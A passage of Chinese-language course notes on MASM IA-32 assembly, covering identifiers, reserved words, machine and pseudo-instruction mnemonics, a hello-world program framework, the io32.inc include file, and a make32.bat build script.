<div class="language-ASM highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-asm-wk1_2-__codelineno-4-1"></a><span class="nf">msg</span><span class="w"> </span><span class="nv">db</span><span class="w"> </span><span class="s">&#39;Hello, World!&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">    </span><span class="c1">; &#39;msg&#39; 是一个名字，表示一个字符串的起始地址</span>
</span></code></pre></div></p>
</div>
<ul>
<li><strong>标号</strong> 用于标识代码位置（如跳转目标）。</li>
<li><strong>名字</strong> 用于标识数据（如变量、常量）。</li>
</ul>
<h3 id="note-cs-asm-wk1_2-_4">标识符<a class="headerlink" href="#note-cs-asm-wk1_2-_4" title="Permanent link">&para;</a></h3>
<p>标号和名字都属于标识符，标识符由程序员自己定义，跟高级语言中的变量定义类似，不能以数字开头，一个源程序中，用户定义的每个标识符必须唯一，也不能是保留字（reserve word）</p>
<details class="note">
<summary>保留字</summary>
<p>保留字（Reserved Word）是汇编语言（以及大多数编程语言）中具有特殊意义的单词。这些单词被编译器或汇编器预先定义和保留，不能用作用户自定义的标识符（如变量名、标号或函数名），因为它们已经用于特定的语法结构或操作</p>
<p>在汇编语言中，常见的保留字有以下几种类型：</p>
<p>指令操作码：用于表示具体的处理器指令，如：</p>
<p><code>MOV</code>、<code>ADD</code>、<code>SUB</code>、<code>MUL</code>、<code>DIV</code>、<code>JMP</code>、<code>CMP</code>、<code>CALL</code>、<code>RET</code> 等。</p>
<p>伪指令（汇编指令）：用于指示汇编器在汇编过程中执行的操作，不直接生成机器指令，如：</p>
<p><code>DB（Define Byte）</code>、<code>DW（Define Word）</code>、<code>DD（Define Double Word）</code>、<code>ORG（Origin）</code>、<code>END（End of Program）</code>、<code>EQU（Equate）</code>等。</p>
<p>寄存器名：用于表示处理器内部的寄存器，如：</p>
<p>EAX、EBX、ECX、EDX（通用寄存器）、CS、DS、SS、ES（段寄存器）等。</p>
<p>数据类型：用于表示数据的类型或大小，如：</p>
<p><code>BYTE</code>、<code>WORD</code>、<code>DWORD</code>、<code>QWORD</code>、<code>TBYTE</code> 等。</p>
<p>条件码和控制结构：用于程序流程控制，如：</p>
<p><code>IF</code>、<code>ELSE</code>、<code>ENDIF</code>、<code>LOOP</code>、<code>WHILE</code>、<code>BREAK</code> 等。</p>
</details>
<h3 id="note-cs-asm-wk1_2-_5">助记符<a class="headerlink" href="#note-cs-asm-wk1_2-_5" title="Permanent link">&para;</a></h3>
<p>助记符是帮助记忆指令功能的符号，主要分硬指令助记符和软指令助记符</p>
<p>在汇编语言中，<strong>硬指令助记符</strong>（也称为 <strong>机器指令助记符</strong> ）和 <strong>软指令助记符</strong> （也称为 <strong>伪指令助记符</strong> ）是两种不同类型的指令，它们用于不同的目的。</p>
<h4 id="note-cs-asm-wk1_2-_6">硬指令助记符（机器指令助记符）<a class="headerlink" href="#note-cs-asm-wk1_2-_6" title="Permanent link">&para;</a></h4>
<p><strong>硬指令助记符</strong> （Machine Instruction Mnemonics）是直接对应于处理器支持的机器语言指令的汇编语言符号。每一个硬指令助记符表示一条由处理器硬件直接执行的具体操作。硬指令助记符是汇编语言的核心部分，它们被翻译成机器码，直接由计算机的 CPU 执行。</p>
<p>特点</p>
<ul>
<li><strong>直接映射到机器代码</strong>：硬指令助记符是汇编程序中最接近硬件的部分，直接对应于 CPU 指令集。</li>
<li><strong>被处理器直接执行</strong>：这些指令是硬件支持的，可以被 CPU 直接执行。</li>
<li><strong>执行特定的操作</strong>：如数据传送、算术操作、逻辑操作、跳转、函数调用等。</li>
</ul>
<p>常见的硬指令助记符</p>
<ul>
<li><strong>数据传送指令</strong>：<code>MOV</code>、<code>PUSH</code>、<code>POP</code> 等。</li>
<li><strong>算术指令</strong>：<code>ADD</code>、<code>SUB</code>、<code>MUL</code>、<code>DIV</code> 等。</li>
<li><strong>逻辑指令</strong>：<code>AND</code>、<code>OR</code>、<code>XOR</code>、<code>NOT</code> 等。</li>
<li><strong>控制流指令</strong>：<code>JMP</code>、<code>JE</code>、<code>JNE</code>、<code>CALL</code>、<code>RET</code> 等。</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-asm-wk1_2-__codelineno-5-1"></a><span class="nf">MOV</span><span class="w"> </span><span class="nb">AX</span><span class="p">,</span><span class="w"> </span><span class="nb">BX</span><span class="w">    </span><span class="c1">; 数据传送指令，将 BX 的值传送到 AX</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-cs-asm-wk1_2-__codelineno-5-2"></a><span class="nf">ADD</span><span class="w"> </span><span class="nb">AX</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; 算术指令，将 5 加到 AX 中</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#note-cs-asm-wk1_2-__codelineno-5-3"></a><span class="nf">JMP</span><span class="w"> </span><span class="nv">start</span><span class="w">     </span><span class="c1">; 控制流指令，跳转到标号 start</span>
</span></code></pre></div>
</div>
<h4 id="note-cs-asm-wk1_2-_7">软指令助记符（伪指令助记符）<a class="headerlink" href="#note-cs-asm-wk1_2-_7" title="Permanent link">&para;</a></h4>
<p><strong>软指令助记符</strong> （Pseudo-Instruction Mnemonics）或 <strong>伪指令</strong>（Pseudo-Instructions）并不是处理器的真实指令。它们是汇编器理解和执行的特殊指令，用来辅助程序开发和编译过程，如定义数据、分配存储、设置程序位置等。这些指令在汇编过程中执行，不会被翻译成机器代码。</p>
<p>特点</p>
<ul>
<li><strong>不对应机器代码</strong> ：软指令助记符是汇编器在汇编时使用的指令，不会被转换为直接的机器指令。</li>
<li><strong>用于编译控制</strong> ：这些指令帮助控制汇编过程，比如定义常量、变量、内存布局等。</li>
<li><strong>用于结构化编程</strong> ：定义宏、设置条件编译等。</li>
</ul>
<p>常见的软指令助记符</p>
<ul>
<li><strong>数据定义指令</strong>：<code>DB</code>（Define Byte）、<code>DW</code>（Define Word）、<code>DD</code>（Define Double Word）等。</li>
<li><strong>编译控制指令</strong>：<code>ORG</code>（Origin，设置代码的起始地址）、<code>END</code>（结束程序）等。</li>
<li><strong>宏定义和使用指令</strong>：<code>MACRO</code>、<code>ENDM</code> 等。</li>
<li><strong>条件编译指令</strong>：<code>IF</code>、<code>ELSE</code>、<code>ENDIF</code> 等。</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-asm-wk1_2-__codelineno-6-1"></a><span class="nf">DATA_SEG</span><span class="w"> </span><span class="ow">SEG</span><span class="nv">MENT</span><span class="w">          </span><span class="c1">; 定义一个数据段</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-cs-asm-wk1_2-__codelineno-6-2"></a><span class="nf">num1</span><span class="w"> </span><span class="nv">DB</span><span class="w"> </span><span class="mi">10</span><span class="w">                </span><span class="c1">; 软指令，定义一个字节变量 &#39;num1&#39; 并初始化为 10</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#note-cs-asm-wk1_2-__codelineno-6-3"></a><span class="nf">DATA_SEG</span><span class="w"> </span><span class="nv">ENDS</span><span class="w">             </span><span class="c1">; 结束数据段</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#note-cs-asm-wk1_2-__codelineno-6-4"></a>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#note-cs-asm-wk1_2-__codelineno-6-5"></a><span class="k">ORG</span><span class="w"> </span><span class="mh">100h</span><span class="w">                  </span><span class="c1">; 软指令，设置代码的起始地址为 100h</span>
</span></code></pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">操作数和参数</p>
<p><strong>操作数</strong> ：表示参与操作的对象，跟在处理器指令后面</p>
<p><strong>参数</strong>   ：伪指令的参数，可以有多个，参数之间用逗号分隔</p>
</div>
<h2 id="note-cs-asm-wk1_2-_8">汇编程序基本框架<a class="headerlink" href="#note-cs-asm-wk1_2-_8" title="Permanent link">&para;</a></h2>
<div class="admonition abstract">
<p class="admonition-title">需要注意的地方</p>
<p>不同汇编语言，不同汇编器，其结构和语法有所不同，我学习的是基于 MASM 的 IA-32 汇编语言</p>
</div>
<p>在使用 MASM（Microsoft Macro Assembler）编写 IA-32 汇编语言程序时，我们通常会遵循一个标准的程序框架。MASM 是微软提供的汇编器，主要用于 Windows 平台，因此其语法和结构会更贴近 Windows 的程序编写风格。MASM 提供了许多宏和指令来简化编写汇编程序的过程。</p>
<h3 id="note-cs-asm-wk1_2-masm-ia-32">基于 MASM 的 IA-32 汇编语言程序框架<a class="headerlink" href="#note-cs-asm-wk1_2-masm-ia-32" title="Permanent link">&para;</a></h3>
<p>一个典型的 MASM 程序框架通常包括以下部分：</p>
<ol>
<li><strong>数据段（.data）</strong>：定义程序中的已初始化数据（如常量、字符串、变量等）。</li>
<li><strong>代码段（.code）</strong>：包含程序的指令（实际操作代码）。</li>
<li><strong>栈段（.stack）</strong>：定义程序运行时使用的堆栈空间（通常为可选项）。</li>
<li><strong>入口点（main 或 start）</strong>：程序的入口点，通常通过 <code>main</code> 或 <code>start</code> 标签来定义。</li>
<li><strong>结束指令（END）</strong>：指示程序的结束点。</li>
</ol>
<div class="admonition example">
<p class="admonition-title">示例：基于 MASM 的 IA-32 汇编程序框架</p>
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-asm-wk1_2-__codelineno-7-1"></a><span class="c1">; eg0101.asm - 程序名称</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-cs-asm-wk1_2-__codelineno-7-2"></a><span class="nf">include</span><span class="w"> </span><span class="nv">io32.inc</span><span class="w">       </span><span class="c1">; 包含头文件 io32.inc</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-cs-asm-wk1_2-__codelineno-7-3"></a>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#note-cs-asm-wk1_2-__codelineno-7-4"></a><span class="nf">.data</span><span class="w">                  </span><span class="c1">; 数据段</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#note-cs-asm-wk1_2-__codelineno-7-5"></a><span class="nf">msg</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="s">&#39;Hello, Assembly!&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">  </span><span class="c1">; 定义一个字符串变量 msg，以回车（13）、换行（10）和结束符（0）结尾</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#note-cs-asm-wk1_2-__codelineno-7-6"></a>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#note-cs-asm-wk1_2-__codelineno-7-7"></a><span class="nf">.code</span><span class="w">                  </span><span class="c1">; 代码段</span>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#note-cs-asm-wk1_2-__codelineno-7-8"></a><span class="nl">start:</span><span class="w">                 </span><span class="c1">; 程序执行起始位置</span>
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#note-cs-asm-wk1_2-__codelineno-7-9"></a>
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#note-cs-asm-wk1_2-__codelineno-7-10"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">eax</span><span class="p">,</span><span class="w"> </span><span class="nv">offset</span><span class="w"> </span><span class="nv">msg</span><span class="w">  </span><span class="c1">; 将 msg 的地址载入 eax 寄存器</span>
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#note-cs-asm-wk1_2-__codelineno-7-11"></a><span class="w">    </span><span class="nf">call</span><span class="w"> </span><span class="nv">dispmsg</span><span class="w">         </span><span class="c1">; 调用 dispmsg 函数，显示消息</span>
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#note-cs-asm-wk1_2-__codelineno-7-12"></a>
</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#note-cs-asm-wk1_2-__codelineno-7-13"></a><span class="w">    </span><span class="nf">exit</span><span class="w"> </span><span class="mi">0</span><span class="w">               </span><span class="c1">; 正常退出程序</span>
</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#note-cs-asm-wk1_2-__codelineno-7-14"></a><span class="nf">end</span><span class="w"> </span><span class="nv">start</span><span class="w">               </span><span class="c1">; 程序结束，指定入口点为 start</span>
</span></code></pre></div>
<p>程序解释</p>
<ol>
<li>
<p><strong><code>include io32.inc</code></strong>: 包含一个名为 <code>io32.inc</code> 的头文件，该文件包含常用的宏、函数声明或输入输出例程。例如，这里使用的 <code>dispmsg</code> 函数在 <code>io32.inc</code> 中定义的，用来在屏幕上显示字符串。</p>
</li>
<li>
<p><strong><code>.data</code> 段</strong>: 数据段，用于定义数据（如变量、常量、字符串等）。在这里，定义了一个字符串 <code>msg</code>，内容为 "Hello, Assembly!"，后面跟着回车（13）、换行（10）和字符串结束符（0）。</p>
</li>
<li>
<p><strong><code>.code</code> 段</strong>: 代码段，包含程序的指令部分。程序从 <code>start</code> 标签开始执行。</p>
<ul>
<li><strong><code>mov eax, offset msg</code></strong>: 将字符串 <code>msg</code> 的地址载入 <code>EAX</code> 寄存器。</li>
<li><strong><code>call dispmsg</code></strong>: 调用 <code>dispmsg</code> 函数，将 <code>msg</code> 的内容显示在屏幕上。</li>
<li><strong><code>exit 0</code></strong>: 正常退出程序，返回码为 <code>0</code>。</li>
</ul>
</li>
<li>
<p><strong><code>end start</code></strong>: 告诉汇编器程序的结束，并指定程序从 <code>start</code> 标签开始</p>
</li>
</ol>
</div>
<details class="info">
<summary>io32.inc</summary>
<p><div class="language-ASM highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-cs-asm-wk1_2-__codelineno-8-1"></a><span class="nf">.nolist</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#note-cs-asm-wk1_2-__codelineno-8-2"></a><span class="c1">;filename: io32.inc</span>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#note-cs-asm-wk1_2-__codelineno-8-3"></a><span class="c1">;A include file used with io32.lib for Windows Console</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#note-cs-asm-wk1_2-__codelineno-8-4"></a>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#note-cs-asm-wk1_2-__codelineno-8-5"></a><span class="w">  </span><span class="nf">.686</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#note-cs-asm-wk1_2-__codelineno-8-6"></a><span class="w">  </span><span class="nf">.model</span><span class="w"> </span><span class="nv">flat</span><span class="p">,</span><span class="nv">stdcall</span>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#note-cs-asm-wk1_2-__codelineno-8-7"></a>
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#note-cs-asm-wk1_2-__codelineno-8-8"></a><span class="w">  </span><span class="nf">option</span><span class="w"> </span><span class="nv">casemap</span><span class="p">:</span><span class="nv">none</span>
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#note-cs-asm-wk1_2-__codelineno-8-9"></a><span class="w">  </span><span class="nf">includelib</span><span class="w"> </span><span class="nv">bin</span><span class="err">\</span><span class="nv">kernel32.lib</span>
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#note-cs-asm-wk1_2-__codelineno-8-10"></a>
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#note-cs-asm-wk1_2-__codelineno-8-11"></a><span class="nf">ExitProcess</span><span class="w"> </span><span class="nv">proto</span><span class="p">,:</span><span class="kt">DWORD</span>
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#note-cs-asm-wk1_2-__codelineno-8-12"></a><span class="nf">exit</span><span class="w">  </span><span class="nv">MACRO</span><span class="w"> </span><span class="nv">dwexitcode</span>
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#note-cs-asm-wk1_2-__codelineno-8-13"></a><span class="w">  </span><span class="nf">invoke</span><span class="w"> </span><span class="nv">ExitProcess</span><span class="p">,</span><span class="nv">dwexitcode</span>
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#note-cs-asm-wk1_2-__codelineno-8-14"></a><span class="w">  </span><span class="nf">ENDM</span>
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#note-cs-asm-wk1_2-__codelineno-8-15"></a>
</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#note-cs-asm-wk1_2-__codelineno-8-16"></a><span class="c1">;declare procedures for inputting and outputting charactor or string</span>
</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#note-cs-asm-wk1_2-__codelineno-8-17"></a><span class="w">  </span><span class="k">extern</span><span class="w"> </span><span class="nv">readc</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">readmsg</span><span class="p">:</span><span class="nv">near</span>
</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#note-cs-asm-wk1_2-__codelineno-8-18"></a><span class="w">  </span><span class="k">extern</span><span class="w"> </span><span class="nv">dispc</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">dispmsg</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">dispcrlf</span><span class="p">:</span><span class="nv">near</span>
</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#note-cs-asm-wk1_2-__codelineno-8-19"></a><span class="c1">;declare procedures for inputting and outputting binary number</span>
</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#note-cs-asm-wk1_2-__codelineno-8-20"></a><span class="w">  </span><span class="k">extern</span><span class="w"> </span><span class="nv">readbb</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">readbw</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">readbd</span><span class="p">:</span><span class="nv">near</span>
</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#note-cs-asm-wk1_2-__codelineno-8-21"></a><span class="w">  </span><span class="k">extern</span><span class="w"> </span><span class="nv">dispbb</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">dispbw</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">dispbd</span><span class="p">:</span><span class="nv">near</span>
</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#note-cs-asm-wk1_2-__codelineno-8-22"></a><span class="c1">;declare procedures for inputting and outputting hexadecimal number</span>
</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#note-cs-asm-wk1_2-__codelineno-8-23"></a><span class="w">  </span><span class="k">extern</span><span class="w"> </span><span class="nv">readhb</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">readhw</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">readhd</span><span class="p">:</span><span class="nv">near</span>
</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#note-cs-asm-wk1_2-__codelineno-8-24"></a><span class="w">  </span><span class="k">extern</span><span class="w"> </span><span class="nv">disphb</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">disphw</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">disphd</span><span class="p">:</span><span class="nv">near</span>
</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#note-cs-asm-wk1_2-__codelineno-8-25"></a><span class="c1">;declare procedures for inputting and outputting unsigned integer number</span>
</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#note-cs-asm-wk1_2-__codelineno-8-26"></a><span class="w">  </span><span class="k">extern</span><span class="w"> </span><span class="nv">readuib</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">readuiw</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">readuid</span><span class="p">:</span><span class="nv">near</span>
</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#note-cs-asm-wk1_2-__codelineno-8-27"></a><span class="w">  </span><span class="k">extern</span><span class="w"> </span><span class="nv">dispuib</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">dispuiw</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">dispuid</span><span class="p">:</span><span class="nv">near</span>
</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#note-cs-asm-wk1_2-__codelineno-8-28"></a><span class="c1">;declare procedures for inputting and outputting signed integer number</span>
</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#note-cs-asm-wk1_2-__codelineno-8-29"></a><span class="w">  </span><span class="k">extern</span><span class="w"> </span><span class="nv">readsib</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">readsiw</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">readsid</span><span class="p">:</span><span class="nv">near</span>
</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30" href="#note-cs-asm-wk1_2-__codelineno-8-30"></a><span class="w">  </span><span class="k">extern</span><span class="w"> </span><span class="nv">dispsib</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">dispsiw</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">dispsid</span><span class="p">:</span><span class="nv">near</span>
</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31" href="#note-cs-asm-wk1_2-__codelineno-8-31"></a><span class="c1">;declare procedures for outputting registers</span>
</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32" href="#note-cs-asm-wk1_2-__codelineno-8-32"></a><span class="w">  </span><span class="k">extern</span><span class="w"> </span><span class="nv">disprb</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">disprw</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">disprd</span><span class="p">:</span><span class="nv">near</span><span class="p">,</span><span class="nv">disprf</span><span class="p">:</span><span class="nv">near</span>
</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33" href="#note-cs-asm-wk1_2-__codelineno-8-33"></a><span class="c1">;declare I/O libraries</span>
</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34" href="#note-cs-asm-wk1_2-__codelineno-8-34"></a><span class="w">  </span><span class="nf">includelib</span><span class="w"> </span><span class="nv">io32.lib</span>
</span><span id="__span-8-35"><a id="__codelineno-8-35" name="__codelineno-8-35" href="#note-cs-asm-wk1_2-__codelineno-8-35"></a>
</span><span id="__span-8-36"><a id="__codelineno-8-36" name="__codelineno-8-36" href="#note-cs-asm-wk1_2-__codelineno-8-36"></a><span class="nf">.list</span>
</span></code></pre></div>
  这个文件是一个包含文件，定义了各种输入/输出（I/O）函数和宏，并且声明了这些函数的原型和它们所在的库。具体内容如下：</p>
<ol>
<li>
<p><strong>汇编选项设置</strong>：</p>
<ul>
<li><strong><code>.686</code></strong>: 指定使用 686 指令集（Pentium Pro 及以上）。</li>
<li><strong><code>.model flat,stdcall</code></strong>: 使用平坦内存模型和 <code>stdcall</code> 调用约定。</li>
<li><strong><code>option casemap:none</code></strong>: 禁用大小写映射，使得标识符是大小写敏感的。</li>
</ul>
</li>
<li>
<p><strong>库引用</strong>：</p>
<ul>
<li><strong><code>includelib bin\kernel32.lib</code></strong>: 引入 Windows API 的 <code>kernel32.lib</code> 库，该库包含常见的系统调用（如 <code>ExitProcess</code>）。</li>
</ul>
</li>
<li>
<p><strong>宏定义</strong>：</p>
<ul>
<li><strong><code>exit MACRO dwexitcode</code></strong>: 定义了一个名为 <code>exit</code> 的宏，用于调用 <code>ExitProcess</code> 函数退出程序。
   <div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-cs-asm-wk1_2-__codelineno-9-1"></a>invoke ExitProcess,dwexitcode
</span></code></pre></div></li>
<li>该宏可以简化退出程序的代码，使得在程序中调用 <code>exit</code> 宏时，可以直接传递一个退出代码。</li>
</ul>
</li>
<li>
<p><strong>外部函数声明</strong>：</p>
<ul>
<li><strong><code>extern</code> 声明</strong>：这些声明告诉汇编器，这些函数在其他地方定义（例如 <code>io32.lib</code> 库中），并且它们是 <code>near</code> 类型（即在相同的段中）。这些函数包括：</li>
<li><strong>字符或字符串的输入/输出</strong>：<ul>
<li><code>readc</code>、<code>readmsg</code>：用于读取字符或字符串。</li>
<li><code>dispc</code>、<code>dispmsg</code>、<code>dispcrlf</code>：用于显示字符、字符串和换行符。</li>
</ul>
</li>
<li><strong>二进制数的输入/输出</strong>：<ul>
<li><code>readbb</code>、<code>readbw</code>、<code>readbd</code>：用于读取字节、字和双字的二进制数。</li>
<li><code>dispbb</code>、<code>dispbw</code>、<code>dispbd</code>：用于显示字节、字和双字的二进制数。</li>
</ul>
</li>
<li><strong>十六进制数的输入/输出</strong>：<ul>
<li><code>readhb</code>、<code>readhw</code>、<code>readhd</code>：用于读取字节、字和双字的十六进制数。</li>
<li><code>disphb</code>、<code>disphw</code>、<code>disphd</code>：用于显示字节、字和双字的十六进制数。</li>
</ul>
</li>
<li><strong>无符号整数的输入/输出</strong>：<ul>
<li><code>readuib</code>、<code>readuiw</code>、<code>readuid</code>：用于读取字节、字和双字的无符号整数。</li>
<li><code>dispuib</code>、<code>dispuiw</code>、<code>dispuid</code>：用于显示字节、字和双字的无符号整数。</li>
</ul>
</li>
<li><strong>有符号整数的输入/输出</strong>：<ul>
<li><code>readsib</code>、<code>readsiw</code>、<code>readsid</code>：用于读取字节、字和双字的有符号整数。</li>
<li><code>dispsib</code>、<code>dispsiw</code>、<code>dispsid</code>：用于显示字节、字和双字的有符号整数。</li>
</ul>
</li>
<li><strong>寄存器的输出</strong>：<ul>
<li><code>disprb</code>、<code>disprw</code>、<code>disprd</code>、<code>disprf</code>：用于显示寄存器的值。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>库文件包含</strong>：</p>
<ul>
<li><strong><code>includelib io32.lib</code></strong>: 包含 <code>io32.lib</code> 库文件，这个库文件实际上实现了这些 <code>extern</code> 声明的输入/输出函数。</li>
</ul>
</li>
</ol>
</details>
<details class="info">
<summary>用于一键运行的make文件</summary>
<div class="language-batch highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-cs-asm-wk1_2-__codelineno-10-1"></a> <span class="p">@</span><span class="k">echo</span> off
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#note-cs-asm-wk1_2-__codelineno-10-2"></a>  <span class="c1">REM make32.bat, for assembling and linking 32-bit Console programs (.EXE)</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#note-cs-asm-wk1_2-__codelineno-10-3"></a>  BIN\ML /c /coff /Fl /Zi <span class="nv">%1</span>.asm
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#note-cs-asm-wk1_2-__codelineno-10-4"></a>  <span class="k">if</span> <span class="k">errorlevel</span> <span class="mi">1</span> <span class="k">goto</span> <span class="nl">terminate</span>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#note-cs-asm-wk1_2-__codelineno-10-5"></a>  BIN\LINK32 /subsystem:console /debug <span class="nv">%1</span>.obj
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#note-cs-asm-wk1_2-__codelineno-10-6"></a>  <span class="k">if</span> <span class="k">errorlevel</span> <span class="mi">1</span> <span class="k">goto</span> <span class="nl">terminate</span>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#note-cs-asm-wk1_2-__codelineno-10-7"></a>  <span class="k">DIR</span> <span class="nv">%1</span>.*
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#note-cs-asm-wk1_2-__codelineno-10-8"></a>  <span class="p">:</span><span class="nl">terminate</span>
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#note-cs-asm-wk1_2-__codelineno-10-9"></a>  <span class="p">@</span><span class="k">echo</span> on
</span></code></pre></div>
<div class="language-batch highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#note-cs-asm-wk1_2-__codelineno-11-1"></a><span class="p">@</span><span class="k">echo</span> off
</span></code></pre></div>
<ul>
<li>关闭命令回显，使批处理文件的命令不显示在控制台窗口中（除了显式打开回显的部分）。</li>
</ul>
